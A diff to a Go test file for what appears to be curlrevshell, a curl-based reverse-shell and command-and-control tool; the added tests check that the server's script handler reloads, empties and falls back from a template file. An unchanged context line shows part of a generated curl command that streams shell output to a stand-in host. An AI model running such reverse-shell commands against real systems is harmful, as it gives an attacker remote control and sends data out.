@@ -5,7 +5,7 @@ package hsrv
  * Tests for script.go
  * By J. Stuart McMurray
  * Created 20240324
- * Last Modified 20240406
+ * Last Modified 20240425
  */
 
 import (
@@ -13,9 +13,12 @@ import (
 	"net"
 	"net/http"
 	"net/http/httptest"
+	"os"
+	"path/filepath"
 	"regexp"
 	"strings"
 	"testing"
+	"text/template"
 
 	"github.com/magisterquis/curlrevshell/lib/opshell"
 )
@@ -71,6 +74,87 @@ curl -Nsk --pinnedpubkey "sha256//xxx=" https://example.com/o/IDID -T- >/dev/nul
 		)
 	}
 	cl.ExpectEmpty(t)
+}
+
+/* Make sure changing and deleting a template file works. */
+func TestServerScriptHandler_FromFile(t *testing.T) {
+	cl, _, _, s := newTestServer(t)
+	fn := filepath.Join(t.TempDir(), "kittens.tmpl")
+	s.tmplf = fn
+	defTxt := "default template"
+	s.defTmpl = template.Must(template.New("").Parse(defTxt))
+
+	var want string
+
+	f := func(t *testing.T) {
+		t.Helper()
+		rr := httptest.NewRecorder()
+		rr.Body = new(bytes.Buffer)
+		s.scriptHandler(
+			rr,
+			httptest.NewRequest(http.MethodGet, "/c", nil),
+		)
+		if http.StatusOK != rr.Code {
+			t.Errorf("Non-OK response code %d", rr.Code)
+		}
+		if got := rr.Body.String(); got != want {
+			t.Errorf(
+				"Incorrect body:\n got: %s\nwant: %s",
+				got,
+				want,
+			)
+		}
+		cl.ExpectEmpty(t)
+	}
+
+	/* Test a custom template file. */
+	t.Run("template_in_file", func(t *testing.T) {
+		if err := os.WriteFile(
+			fn,
+			[]byte(`kittens: {{.URL}}`),
+			0660,
+		); nil != err {
+			t.Fatalf("Error writing template to %s: %s", fn, err)
+		}
+		want = "kittens: example.com"
+		f(t)
+	})
+
+	/* Test a change to the file. */
+	t.Run("changed_file", func(t *testing.T) {
+		if err := os.WriteFile(
+			fn,
+			[]byte(`moose: {{.URL}}`),
+			0660,
+		); nil != err {
+			t.Fatalf("Error writing template to %s: %s", fn, err)
+		}
+		want = "moose: example.com"
+		f(t)
+	})
+
+	/* Test an empty file. */
+	t.Run("empty_file", func(t *testing.T) {
+		if err := os.WriteFile(fn, nil, 0660); nil != err {
+			t.Fatalf(
+				"Error writing empty template to %s: %s",
+				fn,
+				err,
+			)
+		}
+		want = ""
+		t.Run("empty_file", f)
+		f(t)
+	})
+
+	/* Test removing the file. */
+	t.Run("removed_file", func(t *testing.T) {
+		if err := os.Remove(fn); nil != err {
+			t.Fatalf("Error removing %s: %s", fn, err)
+		}
+		want = defTxt
+		f(t)
+	})
 }
 
 func TestC2URL(t *testing.T) {
